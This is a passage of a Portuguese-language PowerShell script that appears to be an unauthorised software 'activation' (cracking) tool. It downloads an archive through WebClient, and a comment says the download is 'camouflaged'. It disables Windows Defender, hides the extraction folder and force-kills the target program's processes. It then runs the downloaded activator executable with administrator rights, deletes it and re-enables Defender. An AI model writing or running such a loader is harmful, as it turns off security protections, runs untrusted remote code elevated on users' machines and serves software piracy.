                                Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                                Write-Host ""
                                Write-Host ""
                                Write-Host -NoNewline "      Chave key do" -ForegroundColor Yellow
                                Write-Host -NoNewline " '$nome_programa' '$versao_disponivel' " -ForegroundColor Cyan
                                Write-Host -NoNewline "'habilitada' " -ForegroundColor Green 
                                Write-Host -NoNewline "para visualização." -ForegroundColor Yellow 
                                Write-Host ""
                                Write-Host "      Iniciando processo inicial de disponibilização da chave key do '$nome_programa'..." -ForegroundColor Green
                                Write-Host ""

                            }
                        } else {

                            Write-Host ""
                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                            Write-Host ""
                            Write-Host "      A versão do programa atualmente instalado é igual a versão disponível para ativação." -ForegroundColor Yellow
                            Write-Host ""
                            Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                            Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                            Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                            Write-Host ""
                            Write-Host "      Iniciando processo inicial de ativação do '$nome_programa'..." -ForegroundColor Green
                            Write-Host ""
                        }
                                        
                        try {

                            $atv_destino = ($nome_programa -replace '\s', '').ToLower()
                            $atv_planoconta = $plano_conta.ToLower()
                            $atv_metodo = ($metodo_ativacao -replace '[/\-]', '').ToLower()

                            # Definir a URL do arquivo e o destino
                            $url = $($linksProductToCheck["link_ativacao_produto"])
                            $destino = "$local_default\atv-$atv_destino.rar"
                            $extracao = "$local_default\ativacao"
                            $extracao_atv = "$local_default\ativacao\atv-$atv_destino\$atv_planoconta\$versao_disponivel\$atv_metodo"
                            $extracao_atv_exe = "$local_default\ativacao\atv-$atv_destino\$atv_planoconta\$versao_disponivel"
                            $destino_atv = $($pathsToCheck["pasta_ativacao"])
                            $destino_final = $($pathsToCheck["pasta_instalacao"])
                            $winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"
                            
                            if (Test-Path $destino) {

                                etapaOneAtv


                            } else {

                                # Baixar o arquivo
                                # $client = New-Object System.Net.WebClient
                                # $client.DownloadFile($url, $destino)

                                try {

                                    # Usando Invoke-WebRequest para baixar o arquivo
                                    # $response = Invoke-WebRequest -Uri $url -OutFile $destino -UseBasicParsing -ErrorAction Stop > $null 2>&1

                                    # Usando o WebClient para camuflar o download do arquivo
                                    $webClient = New-Object System.Net.WebClient
                                    $webClient.DownloadFile($url, $destino)
                                    $webClient.Dispose()
                                    
                                    if ($MetodoSelecionado -eq "Chave/Serial") {
                                        Write-Host ""
                                        Write-Host -NoNewline "      'Etapa de Disponibilização da Chave Key' " -ForegroundColor Magenta
                                        Write-Host -NoNewline "do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "iniciada com sucesso.... " -ForegroundColor Green
                                        Write-Host ""
                                        Write-Host ""
                                    } else {
                                        Write-Host ""
                                        Write-Host -NoNewline "      'Etapa de Ativação' " -ForegroundColor Magenta
                                        Write-Host -NoNewline "do" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                                        Write-Host -NoNewline "iniciada com sucesso...." -ForegroundColor Green
                                        Write-Host ""
                                        Write-Host ""
                                    }
                                } catch {
                                    if ($MetodoSelecionado -eq "Chave/Serial") {
                                        Write-Host ""
                                        Write-Host -NoNewline "      Erro conflitante ao iniciar a" -ForegroundColor Red
                                        Write-Host -NoNewline " 'Etapa de Disponibilização da Chave Key' " -ForegroundColor Magenta
                                        Write-Host -NoNewline "do" -ForegroundColor Red
                                        Write-Host -NoNewline " '$nome_programa $versao_disponivel'." -ForegroundColor Cyan
                                        Write-Host ""
                                        Write-Host ""
                                    } else {
                                        Write-Host ""
                                        Write-Host -NoNewline "      Erro conflitante ao iniciar a" -ForegroundColor Red
                                        Write-Host -NoNewline " 'Etapa de Ativação' " -ForegroundColor Magenta
                                        Write-Host -NoNewline "do" -ForegroundColor Red
                                        Write-Host -NoNewline " '$nome_programa $versao_disponivel'." -ForegroundColor Cyan
                                        Write-Host ""
                                        Write-Host ""
                                    }
                                }

                                if (Test-Path $destino) {

                                    etapaOneAtv

                                } else {
                                    Write-Host ""
                                    Write-Host "      Falha ao baixar o arquivo." -ForegroundColor Red
                                    Write-Host ""

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                }

                            }

                            # Opcional: Remover o arquivo .rar após extração
                            Remove-Item $destino -Recurse -Force 

                            # Anulação do Windows Defender          
                            ConfigWFAtv -StatusConfigWF "Online"

                            # Definir o arquivo baixado e a pasta de extração como ocultos
                            Set-ItemProperty -Path $extracao -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

                            $processesRunning = CheckProcessesRunning
                                            
                            if ($processesRunning) {

                                $processNames = $processesRunning | ForEach-Object { $_.Name } 
                                    
                                foreach ($processName in $processNames) {
                                    $process = Get-Process -Name $processName
                                    Stop-Process -Id $process.Id -Force
                                }
 
                                Write-Host "" 
                                Write-Host ""
                                Write-Host "     !Erro Fatal!" -ForegroundColor Red         
                                Write-Host "     Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Cyan
                                Write-Host "     Finalizando os processos, reinicie novamente a opção selecionada, para continuar com o processo de ativação do $nome_programa." -ForegroundColor Green
                                Write-Host ""

                                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                            } else {
                                
                                # Mover arquivos extraídos para a pasta de destino

                                try {

                                    # Verificar os Processos

                                    # Criar a pasta de destino se não existir
                                    if (-not (Test-Path $destino_atv)) {
                                        New-Item -ItemType Directory -Path $destino_atv | Out-Null
                                    }

                                    $atv_exe_extracao = Get-ChildItem -Path "$extracao_atv" -Filter *.exe -File | Select-Object -First 1
                                    $atv_exe_extracao_file = $atv_exe_extracao.FullName  # Obter o caminho completo do arquivo

                                    if($atv_exe_extracao) {
                                        
                                        # Abrir o arquivo e verificar o conteúdo em busca de uma assinatura do WinRAR
                                        $file_content_extracao_exe = [System.IO.File]::ReadAllBytes($atv_exe_extracao_file)
                                        $file_string_extracao_exe = [System.Text.Encoding]::UTF8.GetString($file_content_extracao_exe)

                                        if ($file_string_extracao_exe -like "*sfxrar.exe*") {
                                        
                                            # Verifica se a pasta de ativação já foi movida para o destino de ativação

                                            if (Test-Path -Path "$destino_atv\$atv_metodo") {
                                            
                                                # Opcional: Remover a pasta do arquivo após extração.
                                                Remove-Item "$destino_atv\$atv_metodo" -Recurse -Force

                                                Start-Sleep -Seconds 5
                                            
                                                # Mover os arquivos e substitui pelos existentes
                                                Move-Item -Path "$extracao_atv_exe\*" -Destination $destino_atv -Force
                                            
                                                Start-Sleep -Seconds 5
                                            
                                                # Após mover a ativação exclui a pasta de ativação aonde foi o local de extração da ativação.

                                                # Opcional: Remover a pasta do arquivo após extração.
                                                Remove-Item $extracao -Recurse -Force

                                            } else {

                                                # Mover os arquivos e substitui pelos existentes
                                                Move-Item -Path "$extracao_atv_exe\*" -Destination $destino_atv -Force

                                                Start-Sleep -Seconds 5
                                            
                                                # Após mover a ativação exclui a pasta de ativação aonde foi o local de extração da ativação.
                                            
                                                # Opcional: Remover a pasta do arquivo após extração.
                                                Remove-Item $extracao -Recurse -Force

                                            }

                                            $atv_exe = Get-ChildItem -Path "$destino_atv\$atv_metodo" -Filter *.exe -File | Select-Object -First 1
                                            $all_files_atv = Get-ChildItem -Path "$destino_atv\$atv_metodo" -File

                                            # Verificar se o arquivo foi encontrado
                                            if ($atv_exe -and $all_files_atv.Count -gt 1) {
                                                
                                                # Executar o arquivo a ativador .exe, e aguarda a conclusão.
                                                Start-Process -FilePath $atv_exe.FullName -Verb RunAs
                                            
                                                Start-Sleep -Seconds 5

                                                # Opcional: Remover a pasta do arquivo após extração.
                                                Remove-Item "$destino_atv\$atv_metodo" -Recurse -Force
                                           
                                            } elseif ($atv_exe -and $all_files_atv.Count -eq 1) {

                                                # Mover os arquivos e substitui pelos existentes
                                                Move-Item -Path "$destino_atv\$atv_metodo\*" -Destination $destino_atv -Force

                                                # Atualizar a variável $atv_exe para o novo local (caso tenha movido o .exe)
                                                $new_atv_exe_path = Join-Path -Path $destino_atv -ChildPath $atv_exe.Name

                                                # Executar o arquivo a ativador .exe, e aguarda a conclusão.
                                                Start-Process -FilePath $new_atv_exe_path -Verb RunAs 

                                                Start-Sleep -Seconds 5

                                                # Opcional: Remover a pasta do arquivo após extração.
                                                Remove-Item "$destino_atv\$atv_metodo" -Recurse -Force
                                            
                                                Start-Sleep -Seconds 5

                                                # Remover o arquivo após a execução
                                                Remove-Item -Path $new_atv_exe_path -Force
                                        
                                            } else {

                                                Write-Host ""
                                                Write-Host "      Nenhum arquivo .exe sfx de ativação foi encontrado no diretório." -ForegroundColor Red
                                                Write-Host ""
                                            }
                                        
                                        } else {

                                            # Mover os arquivos e substitui pelos existentes
                                            Move-Item -Path "$extracao_atv\*" -Destination $destino_atv -Force
                                        
                                            Start-Sleep -Seconds 5

                                            # Opcional: Remover a pasta do arquivo após extração.
                                            Remove-Item $extracao -Recurse -Force
                                        }

                                    } else {
                                        
                                        # Mover os arquivos e substitui pelos existentes
                                        Move-Item -Path "$extracao_atv\*" -Destination $destino_atv -Force
                                        
                                        Start-Sleep -Seconds 5

                                        # Opcional: Remover a pasta do arquivo após extração.
                                        Remove-Item $extracao -Recurse -Force
                                    }
                                     
                                    if ($MetodoSelecionado -eq "Chave/Serial") {
                                        
                                        Write-Host -NoNewline "      Aguarde..., Enquanto disponibilizamos os" -ForegroundColor Yellow
                                        Write-Host -NoNewline " 'Dados de Acesso' " -ForegroundColor Magenta
                                        Write-Host -NoNewline "do seu" -ForegroundColor Yellow
                                        Write-Host -NoNewline " '$nome_programa'. " -ForegroundColor Cyan
                                        Write-Host ""
                                        Write-Host ""
                                        Write-Host -NoNewline "      Os seus" -ForegroundColor Yellow
                                        Write-Host -NoNewline " 'Dados de Acesso' " -ForegroundColor Magenta
                                        Write-Host -NoNewline "foram gerados com sucesso!'" -ForegroundColor Green
                                        Write-Host ""

                                        # Opcional: Remover a pasta do arquivo após extração.
                                        # Remove-Item "$destino_atv\$versao_disponivel" -Recurse -Force

                                        # Reversão do Windows Defender
                                        ConfigWFAtv -StatusConfigWF "Offline"
                                        
                                        Start-Sleep -Seconds 5    

                                        if ($stepsAtvToCheck["processo_ativacao"].Contains('Pré-instalação')) {
                                            
                                            Write-Host ""

                                        } else {

                                            Write-Host ""   

                                            $opcao_verficar_ativacao = Read-Host "      Deseja iniciar o $nome_programa para inserir os dados de sua chave para ativação? (S/N)"
                                    
                                            Write-Host ""
                                               
                                            if ($opcao_verficar_ativacao -eq 's') { 
                                            
                                                if ($metodo_ativacao -eq "Chave/Serial") {
                                                    Start-Process -FilePath $pathsToCheck["exe_produto_open"] -PassThru
                                                } else {
                                                    Start-Process -FilePath $pathsToCheck["exe_instalacao"] -PassThru
                                                } 
                                            }

                                            Write-Host ""

                                        }
                                        
                                        Write-Host -NoNewline "      Tutorial simples de " -ForegroundColor Yellow
                                        Write-Host -NoNewline "'Ativação do $nome_programa':" -ForegroundColor Cyan
                                        Write-Host ""

                                        Write-Host ""

                                        $linhas_passo_atv = $($stepsAtvToCheck['passo_ativacao']) -split "\."
                                        
                                        $contador_passo_atv = 1

                                        foreach ($linha_passo_atv in $linhas_passo_atv) {
                                            if ($linha_passo_atv.Trim() -ne "") {
                                                Write-Host -NoNewline "      $contador_passo_atv - " -ForegroundColor Green
                                                Write-Host -NoNewline "$linha_passo_atv." -ForegroundColor Yellow
                                                Write-Host ""
                                                $contador_passo_atv++
                                            }
                                        }
                                        
                                        Write-Host ""

                                        $opcao_tutorial_ativacao = Read-Host "      Deseja abrir o link com tutorias para ativação de registro de sua chave key? (S/N)"
                                        
                                        if ($opcao_tutorial_ativacao -eq 's') {

                                            $urlPattern = '^(https?|ftp)://[^\s/$.?#].[^\s]*$'

                                            $link_tutorial_ativacao_produto = $($lessonProductToCheck['link_tutorial_ativacao'])

                                            if ($link_tutorial_ativacao_produto -match $urlPattern) {
                                                Start-Process $link_tutorial_ativacao_produto
                                            } else {
                                                Write-Host ""
                                                Write-Host "      Infelizmente, o $nome_programa não possui um link de tutorial de ativação." -ForegroundColor Red
                                            }
                                            
                                            Write-Host ""

                                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                        
                                        } else {
                                            
                                            Write-Host ""
                                            
                                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

                                        }

                                    } else {
                                        Write-Host ""
                                        Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                                        Write-Host -NoNewline "     * 7 - " -ForegroundColor Cyan                                                                   
                                        Write-Host -NoNewline "Blindagem da dll com chaveamento no dispositivo..." -ForegroundColor Yellow
                                        Write-Host -NoNewline " [70%]" -ForegroundColor Green
                                        Write-Host ""
                                        Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                                        Write-Host -NoNewline "     * 8 - " -ForegroundColor Cyan
                                        Write-Host -NoNewline "Verificando funcionando do $nome_programa e efetivação da ativação..." -ForegroundColor Yellow
                                        Write-Host -NoNewline " [80%]" -ForegroundColor Green
                                        Write-Host ""
                                        Write-Host "     ================================================================================================================" -ForegroundColor DarkYellow
                                        Write-Host -NoNewline "     * 9 - " -ForegroundColor Cyan
                                        Write-Host -NoNewline "Concluindo processo de ativação do $nome_programa..." -ForegroundColor Yellow
                                        Write-Host -NoNewline " [100%]" -ForegroundColor Green
                                        Write-Host ""
                                        Write-Host "     ================================================================================================================" -ForegroundColor Green   
                                       
                                        # Opcional: Remover a pasta do arquivo após extração.
                                        # Remove-Item "$destino_atv\$versao_disponivel" -Recurse -Force

                                        # Reversão do Windows Defender
                                        ConfigWFAtv -StatusConfigWF "Offline"
                                                
                                        Write-Host ""
                                    
                                        $opcao_verficar_ativacao = Read-Host "      Deseja iniciar o $nome_programa para validar sua ativação? (S/N)"
                                    
                                        Write-Host ""
                                               
                                        if ($opcao_verficar_ativacao -eq 's') {
                                            
                                            Start-Process -FilePath $programPath -PassThru -Wait

                                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                        }
                                    
                                    }          

                                } catch {

                                    Write-Host ""
                                    Write-Host "      Erro ao mover os arquivos: $_"  -ForegroundColor Red
                                    Write-Host ""

                                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                                }

                            }

                        } catch {

                            Write-Host ""
                            Write-Host "      Erro ao baixar o arquivo: $_" -ForegroundColor Red
                            Write-Host ""

                            if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                        }
                    }

                } else {

                    if ($MetodoSelecionado -eq "Chave/Serial") {
                        
                        Write-Host ""
                        Write-Host -NoNewline "      Você precisa ter instalado no seu computador, o" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                        Write-Host -NoNewline "para que a" -ForegroundColor Yellow
                        Write-Host -NoNewline " 'Chave/Serial' " -ForegroundColor Magenta
                        Write-Host -NoNewline "disponível para visualização seja compatível e efetiva na sua ativação." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host -NoNewline "      A versão do" -ForegroundColor Red
                        Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                        Write-Host -NoNewline "instalado no seu computador, é diferente da" -ForegroundColor Red
                        Write-Host -NoNewline " '$versao_disponivel' " -ForegroundColor Cyan
                        Write-Host -NoNewline "disponível para instalação." -ForegroundColor Red
                        Write-Host ""
                        Write-Host -NoNewline "      Desinstale o" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                        Write-Host -NoNewline "atual, e instale a versão compatível de ativação que é:" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                        Write-Host ""
                        Write-Host ""

                    } else {
                        Write-Host ""
                        Write-Host -NoNewline "      A versão do" -ForegroundColor Red
                        Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                        Write-Host -NoNewline "instalado no seu computador, é diferente da" -ForegroundColor Red
                        Write-Host -NoNewline " '$versao_disponivel' " -ForegroundColor Cyan
                        Write-Host -NoNewline "disponível para instalação." -ForegroundColor Red
                        Write-Host ""
                        Write-Host -NoNewline "      Desinstale o" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                        Write-Host -NoNewline "atual, e instale a versão compatível de ativação que é:" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                        Write-Host ""
                        Write-Host ""
                    }

                    if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
                }

            } catch {
                
                Write-Host ""
                Write-Host "      Erro ao obter informações do programa no caminho $programPath" -ForegroundColor Red
                Write-Host ""

                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
            }

        } else {

            foreach ($path in $pathsToCheck) {
                if (Test-Path $($path['pasta_instalacao_default']) -PathType Container) {
                    $folderFoundAnterior = $true
                    break

                    $subfoldersAnterior = Get-ChildItem -Path $folderFoundAnterior -Directory
                    $subfolderPathAnterior = $subfoldersAnterior[0].FullName
                    $filesInSubfolderAnterior = Get-ChildItem -Path $subfolderPathAnterior -File
                }
            }

            if($folderFoundAnterior -and $subfoldersAnterior.Count -ge 1 -and $filesInSubfolderAnterior.Count -gt 2){

                # Versão Anterior:

                $firstExePathAnterior = $exePath_install_found[0].FullName

                $versionInfoAnterior = (Get-Item $firstExePathAnterior).VersionInfo
                $programVersionAnterior = $versionInfoAnterior.FileVersion

                # Verificar se $programVersion contém ',' e substituir por '.'
                if ($programVersionAnterior -match ',') {
                        
                    $programVersionAnterior = $programVersionAnterior -replace '\s+', ''  # Remove todos os espaços
                    $programVersionAnterior = $programVersionAnterior -replace ',', '.'
                }

                $folderFoundAnterior = $false

                if ($MetodoSelecionado -eq "Chave/Serial") {
                    Write-Host ""
                    Write-Host -NoNewline "      Você precisa ter instalado no seu computador, o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline "para que a" -ForegroundColor Yellow
                    Write-Host -NoNewline " 'Chave/Serial' " -ForegroundColor Magenta
                    Write-Host -NoNewline "disponível para visualização seja compatível e efetiva na sua ativação." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host -NoNewline "      A versão do" -ForegroundColor Red
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "instalado no seu computador, é diferente da" -ForegroundColor Red
                    Write-Host -NoNewline " '$versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline "disponível para instalação." -ForegroundColor Red
                    Write-Host ""
                    Write-Host -NoNewline "      Desinstale o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "atual, e instale a versão compatível de ativação que é:" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host ""

                } else {
                    Write-Host ""
                    Write-Host -NoNewline "      A versão do" -ForegroundColor Red
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "instalado no seu computador, é diferente da" -ForegroundColor Red
                    Write-Host -NoNewline " '$versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline "disponível para instalação." -ForegroundColor Red
                    Write-Host ""
                    Write-Host -NoNewline "      Desinstale o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $programVersionAnterior' " -ForegroundColor Cyan
                    Write-Host -NoNewline "atual, e instale a versão compatível de ativação que é:" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host ""
                    Write-Host ""
                }

                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }

            } else {

                if ($MetodoSelecionado -eq "Chave/Serial") {

                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Red
                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                    Write-Host -NoNewline "não está instalado no computador." -ForegroundColor Red
                    Write-Host ""
                    Write-Host -NoNewline "      Instale o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline ", para conseguir disponibilizar a visualização de sua 'Chave/Serial' em sequência." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host ""

                } else {
                    Write-Host ""
                    Write-Host -NoNewline "      O programa" -ForegroundColor Red
                    Write-Host -NoNewline " '$nome_programa' " -ForegroundColor Cyan
                    Write-Host -NoNewline "não está instalado no computador." -ForegroundColor Red
                    Write-Host ""
                    Write-Host -NoNewline "      Instale o" -ForegroundColor Yellow
                    Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                    Write-Host -NoNewline ", para conseguir realizar sua ativação em sequência." -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host ""
                }

                if ( $EtapaInstAtv ) { Start-Sleep -Seconds 5 }
            }

        }
        
    }

    function DesinstalarPrograma {
        
        param(
            [bool]$EtapaInstAtv
        )

        cls

        $atv_destino = ($nome_programa -replace '\s', '').ToLower()
        $atv_planoconta = $plano_conta.ToLower()

        # Definir a URL do arquivo e o destino para WF
        $extracao = "$local_default\ativacao"
        $extracao_atv = "$local_default\ativacao\atv-$atv_destino\$atv_planoconta\$versao_disponivel"
        $destino_atv = $($pathsToCheck["pasta_instalacao"])
        $destino_atv_key = $($pathsToCheck["pasta_ativacao"])

        # Verificação desinstalação completa (verficações de versões anteriores)

        $pasta_instalacao_default = $($pathsToCheck['pasta_instalacao_default'])           

        # Versão Anterior:

        #$firstExePathAnterior = $exePath_install_found[0].FullName

        #$versionInfoAnterior = (Get-Item $firstExePathAnterior).VersionInfo
        #$programVersionAnterior = $versionInfoAnterior.FileVersion

        $produto_formatado = $nome_programa.Trim().ToUpper()
        $fixedWidthEtapaDesinstalacao = 120  # Largura total da linha

        # Frase a ser centralizada
        $etapaDesinstalacaoTexto = "ETAPA DE DESINSTALAÇÃO DO $($produto_formatado)"
        $etapaDesinstalacaoTextoLength = $etapaDesinstalacaoTexto.Length

        # Calcula o número de espaços necessários para centralizar
        $spacesNeededEtapaDesinstalacao = [Math]::Max(([Math]::Floor(($fixedWidthEtapaDesinstalacao - $etapaDesinstalacaoTextoLength) / 2)), 0)
        $spacesEtapaDesinstalacao = " " * $spacesNeededEtapaDesinstalacao

        Write-Host ""
        Write-Host "     ================================================================================================================" -ForegroundColor Green
        Write-Host "$spacesEtapaDesinstalacao$etapaDesinstalacaoTexto" -ForegroundColor Cyan
        Write-Host "     ================================================================================================================" -ForegroundColor Green

        # Lógica para desinstalação do programa

        # Função para verificar se os processos estão em execução

        function CheckProcessesRunning {

            foreach ($processoUninstall in $processesToCheck['desinstalacao']) {

                $detalhes_processo_uninstall = $processoUninstall -split ","

                $processesToCheck = @($($detalhes_processo_uninstall[0]), $($detalhes_processo_uninstall[1]), $($detalhes_processo_uninstall[2]), $($detalhes_processo_uninstall[3]), $($detalhes_processo_uninstall[4]))
                return Get-Process | Where-Object { $processesToCheck -contains $_.Name }   
            }
        
        }

        if (Test-Path -Path $pasta_instalacao_default -PathType Container) {

            $exePath_unis_atual = $($pathsToCheck['exe_desinstalacao'])
            $exePath_unis_default = [System.IO.Path]::GetFileName($exePath_unis_atual)
         
            $exePath_install_atual = $($pathsToCheck['exe_instalacao'])
            $exePath_install_default = [System.IO.Path]::GetFileName($exePath_install_atual)

            $exePath_unis_found = Get-ChildItem -Path $pasta_instalacao_default -Recurse -Filter $exePath_unis_default -ErrorAction SilentlyContinue
            $exePath_install_found = Get-ChildItem -Path $pasta_instalacao_default -Recurse -Filter $exePath_install_default -ErrorAction SilentlyContinue

            $folderFound = $null
            $folderFoundAtual = $false
        
            # Desinstalar o Programa Manualmente

            foreach ($path in $pathsToCheck) {
    
                # Testa a primeira condição (pasta_instalacao_default)
                $pathsToCheckFolderInstall = $path['pasta_instalacao_default']

                if (Test-Path $pathsToCheckFolderInstall -PathType Container) {
                    $folderFound = $pathsToCheckFolderInstall
                }

                # Testa a segunda condição (pasta_instalacao)
                if (Test-Path $path['pasta_instalacao'] -PathType Container) {
                    $folderFoundAtual = $true
                }

                # Interrompe o laço se uma das condições for atendida
                if ($folderFound -or $folderFoundAtual) {
                    break
                }
            }

            $subfolders = Get-ChildItem -Path $folderFound -Directory -Recurse
        
            if($subfolders.Count -gt 0) {
                # Itera sobre todas as subpastas e pega seus caminhos completos
                foreach ($subfolder in $subfolders) {
                
                    # $lastSegmentFolderAtual = Split-Path -Path $($pathsToCheck['pasta_instalacao']) -Leaf
                    $subfolderPath = $subfolder.FullName

                    if ($subfolderPath -like $($pathsToCheck['pasta_instalacao'])) {
                        $filesExeInfolderAtual = Get-ChildItem -Path $subfolderPath -File | Where-Object { $_.Extension -eq ".exe" }
                        $filesInSubfolder = Get-ChildItem -Path $subfolderPath -File 
                        $filesInFolder = Get-ChildItem -Path $folderFound -File
                    } else {
                        $filesInFolder = Get-ChildItem -Path $folderFound -File
                    }
                }
            } else {
                $filesInFolder = Get-ChildItem -Path $folderFound -File 
            } 

        } else {

            $folderFound = $null
            $folderFoundAtual = $false
        
            # Desinstalar o Programa Manualmente

            foreach ($path in $pathsToCheck) {
    
                # Testa a primeira condição (pasta_instalacao_default)
                $pathsToCheckFolderInstall = $path['pasta_instalacao_default']

                if (Test-Path $pathsToCheckFolderInstall -PathType Container) {
                    $folderFound = $pathsToCheckFolderInstall
                }

                # Testa a segunda condição (pasta_instalacao)
                if (Test-Path $path['pasta_instalacao'] -PathType Container) {
                    $folderFoundAtual = $true
                }

                # Interrompe o laço se uma das condições for atendida
                if ($folderFound -or $folderFoundAtual) {
                    break
                }
            }
        }
                         
        if (($folderFoundAtual -and $filesExeInfolderAtual.Count -ge 2) -or ($folderFoundAtual -and $filesExeInfolderAtual.Count -ge 2 -and $folderFound -and $subfolders.Count -ge 1 -and $filesInSubfolder.Count -gt 2) -or ($folderFound -and $filesInFolder.Count -ge 4)) {
            
            $processesRunning = CheckProcessesRunning
                            
            $processNames = $processesRunning | ForEach-Object { $_.Name }

            foreach ($processName in $processNames) {
                $process = Get-Process -Name $processName
                Stop-Process -Id $process.Id -Force
            }

            if ($processesRunning){
                
                Write-Host ""
                Write-Host "     ===============================================================================================================" -ForegroundColor Red
                Write-Host ""
                Write-Host "      Os processos $($processNames -join ', ') estão em execução." -ForegroundColor Yellow
                Write-Host "      Fechando os processos para iniciar a desinstalação..." -ForegroundColor Green
                Write-Host ""

                # Versão Anterior:

                $firstExePathAnterior = $exePath_install_found[0].FullName

                $versionInfoAnterior = (Get-Item $firstExePathAnterior).VersionInfo
                $programVersionAnterior = $versionInfoAnterior.FileVersion

                # Verificar se $programVersion contém ',' e substituir por '.'
                if ($programVersionAnterior -match ',') {
                        
                    $programVersionAnterior = $programVersionAnterior -replace '\s+', ''  # Remove todos os espaços
                    $programVersionAnterior = $programVersionAnterior -replace ',', '.'
                }

                $programPath = "$($pathsToCheck['exe_instalacao'])"
                $folderFoundAtual = $false

                foreach ($path in $pathsToCheck) {
                    if (Test-Path $($path['pasta_instalacao']) -PathType Container) {
                        $folderFoundAtual = $true
                        break
                    }
                }

                if ($folderFoundAtual) {
                    
                    $versionInfo = (Get-Item $programPath).VersionInfo
                    $programVersion = $versionInfo.FileVersion

                    # Verificar se $programVersion contém ',' e substituir por '.'
                    if ($programVersion -match ',') {
                        
                        $programVersion = $programVersion -replace '\s+', ''  # Remove todos os espaços
                        $programVersion = $programVersion -replace ',', '.'

                        # Extrair os dois primeiros números da versão do programa e da versão disponível
                        $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                        $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                        # Converter a versão do programa para um formato numérico
                        $programVersionNumerica = [version]($programVersionParts -join '.')
                        $disponVersionNumerica = [Version]($disponivelParts -join '.')

                    } else {

                        # Extrair os dois primeiros números da versão do programa e da versão disponível
                        $programVersionParts = $programVersion -split '\.' | Select-Object -First 2
                        $disponivelParts = $versao_disponivel -split '\.' | Select-Object -First 2
                                
                        # Converter a versão do programa para um formato numérico
                        $programVersionNumerica = [version]($programVersionParts -join '.')
                        $disponVersionNumerica = [Version]($disponivelParts -join '.')
                    }


                    if ($programVersionNumerica -eq $disponVersionNumerica) {
                   
                        Write-Host "     ================================================================================================================" -ForegroundColor Green
                        Write-Host ""
                        Write-Host "      A versão do programa atualmente instalado é igual a versão disponível de instalação." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
                        Write-Host -NoNewline " '$nome_programa $versao_disponivel' " -ForegroundColor Cyan
                        Write-Host -NoNewline "já está instalado no seu computador." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host "      Iniciando processo de desinstalação do '$nome_programa'..." -ForegroundColor Green
                        Write-Host ""
                   
                    } else {

                        Write-Host "     ================================================================================================================" -ForegroundColor Green
                        Write-Host ""
                        Write-Host "      A versão do programa atualmente instalado é diferente a versão disponível de instalação." -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host -NoNewline "      O programa" -ForegroundColor Yellow
